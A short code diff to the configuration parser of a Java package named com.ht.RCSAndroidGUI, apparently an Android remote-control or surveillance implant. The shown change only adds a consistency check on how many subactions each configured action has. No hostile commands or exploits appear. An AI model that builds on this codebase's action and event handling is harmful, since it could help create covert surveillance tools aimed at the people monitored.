@@ -23,6 +23,7 @@ import com.ht.RCSAndroidGUI.crypto.Crypto;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.event.EventConf;
 import com.ht.RCSAndroidGUI.event.EventType;
+import com.ht.RCSAndroidGUI.util.Check;
 import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -311,7 +312,7 @@ public class Configuration {
 			for (int i = 0; i < actionNum; i++) {
 				final int subNum = wrappedClearConf.getInt();
 
-				final Action a = new Action(i, subNum);
+				final Action a = new Action(i);
 
 				Log.d("QZ", TAG + " Action " + i + " SubActions: " + subNum);
 
@@ -329,6 +330,9 @@ public class Configuration {
 
 					Log.d("QZ", TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen);
 				}
+				
+				Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number");
+				
 
 				status.addAction(a);
 			}
